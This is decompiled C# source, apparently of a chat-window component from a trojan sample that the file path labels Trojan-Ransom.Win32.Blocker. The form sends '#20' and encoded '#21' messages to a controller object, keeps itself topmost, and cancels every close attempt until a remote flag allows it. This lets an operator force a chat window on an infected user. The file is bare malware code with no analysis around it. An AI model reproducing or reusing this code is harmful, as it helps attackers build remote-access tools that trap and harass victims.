// Decompiled with JetBrains decompiler
// Type: n.chat
// Assembly: n, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E5EDA7BE-EB82-450E-87CA-EBEBA9467A9F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.hpqa-e14c03e0d19e65dbe36222cf50f788bc70772b23bbe20743843ead64a9d90ef7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using n.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace n
{
  [DesignerGenerated]
  public class chat : Form
  {
    private IContainer components;
    [AccessedThroughProperty("T2")]
    private TextBox _T2;
    [AccessedThroughProperty("B1")]
    private Button _B1;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    [AccessedThroughProperty("T1")]
    private RichTextBox _T1;
    public static bool clos;
    public string nick;

    public chat()
    {
      this.FormClosing += new FormClosingEventHandler(this.chat_FormClosing);
      this.Resize += new EventHandler(this.chat_Resize);
      this.MaximizedBoundsChanged += new EventHandler(this.chat_MaximizedBoundsChanged);
      this.SizeChanged += new EventHandler(this.chat_SizeChanged);
      this.Load += new EventHandler(this.chat_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.T2 = new TextBox();
      this.B1 = new Button();
      this.Timer1 = new Timer(this.components);
      this.T1 = new RichTextBox();
      this.SuspendLayout();
      this.T2.BackColor = SystemColors.WindowText;
      this.T2.ForeColor = SystemColors.InactiveCaption;
      TextBox t2_1 = this.T2;
      Point point1 = new Point(12, 364);
      Point point2 = point1;
      t2_1.Location = point2;
      this.T2.Name = "T2";
      TextBox t2_2 = this.T2;
      Size size1 = new Size(450, 20);
      Size size2 = size1;
      t2_2.Size = size2;
      this.T2.TabIndex = 2;
      this.B1.FlatStyle = FlatStyle.Flat;
      Button b1_1 = this.B1;
      point1 = new Point(468, 364);
      Point point3 = point1;
      b1_1.Location = point3;
      this.B1.Name = "B1";
      Button b1_2 = this.B1;
      size1 = new Size(133, 23);
      Size size3 = size1;
      b1_2.Size = size3;
      this.B1.TabIndex = 3;
      this.B1.Text = "Send";
      this.B1.UseVisualStyleBackColor = true;
      this.Timer1.Enabled = true;
      this.T1.BackColor = SystemColors.WindowText;
      this.T1.ForeColor = SystemColors.InactiveCaption;
      RichTextBox t1_1 = this.T1;
      point1 = new Point(12, 12);
      Point point4 = point1;
      t1_1.Location = point4;
      this.T1.Name = "T1";
      this.T1.ReadOnly = true;
      RichTextBox t1_2 = this.T1;
      size1 = new Size(450, 346);
      Size size4 = size1;
      t1_2.Size = size4;
      this.T1.TabIndex = 4;
      this.T1.Text = "";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.InactiveCaptionText;
      size1 = new Size(413, 233);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.T1);
      this.Controls.Add((Control) this.B1);
      this.Controls.Add((Control) this.T2);
      this.Name = nameof (chat);
      this.ShowIcon = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (chat);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox T2
    {
      get => this._T2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        KeyPressEventHandler pressEventHandler = new KeyPressEventHandler(this.T2_KeyPress);
        EventHandler eventHandler = new EventHandler(this.T2_TextChanged);
        if (this._T2 != null)
        {
          this._T2.KeyPress -= pressEventHandler;
          this._T2.TextChanged -= eventHandler;
        }
        this._T2 = value;
        if (this._T2 == null)
          return;
        this._T2.KeyPress += pressEventHandler;
        this._T2.TextChanged += eventHandler;
      }
    }

    internal virtual Button B1
    {
      get => this._B1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.B1_Click);
        if (this._B1 != null)
          this._B1.Click -= eventHandler;
        this._B1 = value;
        if (this._B1 == null)
          return;
        this._B1.Click += eventHandler;
      }
    }

    internal virtual Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual RichTextBox T1
    {
      get => this._T1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.T1_TextChanged);
        if (this._T1 != null)
          this._T1.TextChanged -= eventHandler;
        this._T1 = value;
        if (this._T1 == null)
          return;
        this._T1.TextChanged += eventHandler;
      }
    }

    private void chat_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (chat.clos)
        return;
      e.Cancel = true;
    }

    private void chat_Resize(object sender, EventArgs e) => this.fx();

    private void chat_MaximizedBoundsChanged(object sender, EventArgs e) => this.fx();

    public void fx()
    {
      try
      {
        this.T1.Width = checked (this.Width - 40);
        this.T2.Width = checked (this.B1.Left - 20);
        this.T2.Top = checked (this.Height - this.T2.Height - 50);
        this.T1.Height = checked (this.T2.Top - 20);
        this.B1.Left = checked (this.T1.Width - this.B1.Width + 12);
        this.B1.Top = checked (this.T2.Top - 3);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void T2_KeyPress(object sender, KeyPressEventArgs e)
    {
      if (Strings.Asc(e.KeyChar) != 13)
        return;
      try
      {
        if (this.T2.Text.Length <= 0)
          return;
        B b = MyProject.Forms.B;
        string y = IND.Y;
        TextBox t2 = this.T2;
        string text = t2.Text;
        string str1 = API.ENB(ref text);
        t2.Text = text;
        string str2 = "#21" + y + str1;
        ref string local = ref str2;
        b.SEND(ref local);
        RichTextBox t1 = this.T1;
        t1.Text = t1.Text + "Me : " + this.T2.Text + "\r\n";
        this.T2.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void chat_SizeChanged(object sender, EventArgs e) => this.fx();

    private void chat_Load(object sender, EventArgs e)
    {
      try
      {
        B b = MyProject.Forms.B;
        string str = "#20";
        ref string local = ref str;
        b.SEND(ref local);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.TopMost = true;
      this.Show();
    }

    private void B1_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.T2.Text.Length <= 0)
          return;
        B b = MyProject.Forms.B;
        string y = IND.Y;
        TextBox t2 = this.T2;
        string text = t2.Text;
        string str1 = API.ENB(ref text);
        t2.Text = text;
        string str2 = "#21" + y + str1;
        ref string local = ref str2;
        b.SEND(ref local);
        RichTextBox t1 = this.T1;
        t1.Text = t1.Text + "Me : " + this.T2.Text + "\r\n";
        this.T2.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void T2_TextChanged(object sender, EventArgs e)
    {
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (!chat.clos)
        return;
      this.Close();
    }

    private void T1_TextChanged(object sender, EventArgs e)
    {
      try
      {
        this.T1.SelectionStart = checked (this.T1.Text.Length - 1);
        this.T1.ScrollToCaret();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
